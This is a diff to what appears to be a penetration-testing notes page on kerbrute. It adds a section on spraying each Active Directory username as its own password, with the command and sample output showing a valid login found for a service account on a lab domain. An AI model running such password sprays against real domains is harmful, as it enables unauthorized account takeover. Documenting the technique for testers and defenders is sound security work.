@@ -98,6 +98,27 @@ $ ./kerbrute passwordspray --dc 10.10.10.10 -d offsec.nl users.txt Welkom01!
 Version: v1.0.3 (9dad6e1) - 02/15/21 - Ronnie Flathers @ropnop
 ```
 
+#### Username as password
+
+It can be helpfull to use [LDAPDomainDump]({{< ref "ldapdomaindump" >}}) to gather all user accountnames and use them as input for the 'user-as-pass' spray.
+
+```plain
+$ ./kerbrute passwordspray --dc 10.10.10.10 -d offsec.nl users.txt --user-as-pass
+
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/   \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 01/17/22 - Ronnie Flathers @ropnop
+
+2022/01/17 15:35:28 >  Using KDC(s):
+2022/01/17 15:35:28 >   10.10.10.10:88
+
+2022/01/17 15:35:31 >  [+] VALID LOGIN:  svc_dcsync@offsec.nl:svc_dcsync
+2022/01/17 15:35:38 >  Done! Tested 4393 logins (1 successes) in 9.460 seconds
+```
+
 ### URL list
 
 * [Github.com - kerbrute](https://github.com/ropnop/kerbrute)
